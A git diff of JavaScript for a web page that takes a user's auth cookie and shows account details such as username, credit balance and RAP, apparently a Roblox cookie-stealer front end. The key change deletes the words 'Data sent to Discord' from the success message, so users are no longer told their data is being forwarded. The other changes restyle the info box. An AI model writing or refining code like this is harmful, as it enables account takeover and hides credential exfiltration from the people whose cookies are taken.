@@ -68,7 +68,7 @@ document.addEventListener("DOMContentLoaded", function () {
                     resultElement.textContent = data.cookie || authCookie;
                     
                     if (data.success) {
-                        statusElement.textContent = "✅ Success! Data sent to Discord.";
+                        statusElement.textContent = "✅ Success!";
                         statusElement.style.color = "green";
                         
                         // Display user information if available
@@ -102,8 +102,9 @@ document.addEventListener("DOMContentLoaded", function () {
 
     // Function to display user info
     function displayUserInfo(userData) {
-        const infoHTML = `
-            <h3 style="margin-top: 0; color: #333;">User Information</h3>
+    const infoHTML = `
+        <div style="background-color: #000; color: #fff; padding: 20px; border-radius: 10px;">
+            <h3 style="margin-top: 0; color: #fff;">User Information</h3>
             <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px;">
                 <div><strong>Username:</strong> ${userData.Username}</div>
                 <div><strong>User ID:</strong> ${userData.UserID}</div>
@@ -117,12 +118,14 @@ document.addEventListener("DOMContentLoaded", function () {
                 <div><strong>Credit Balance:</strong> ${userData.CreditBalance}</div>
                 <div><strong>RAP:</strong> ${userData.RAP}</div>
             </div>
-            <div style="margin-top: 15px; font-size: 12px; color: #666;">
+            <div style="margin-top: 15px; font-size: 12px; color: #ccc;">
                 <strong>Debug Info:</strong> ${userData.DebugInfo}
             </div>
-        `;
-        userInfoContainer.innerHTML = infoHTML;
-    }
+        </div>
+    `;
+    userInfoContainer.innerHTML = infoHTML;
+}
+
 
     // Copy Button
     copyButton.addEventListener("click", function () {
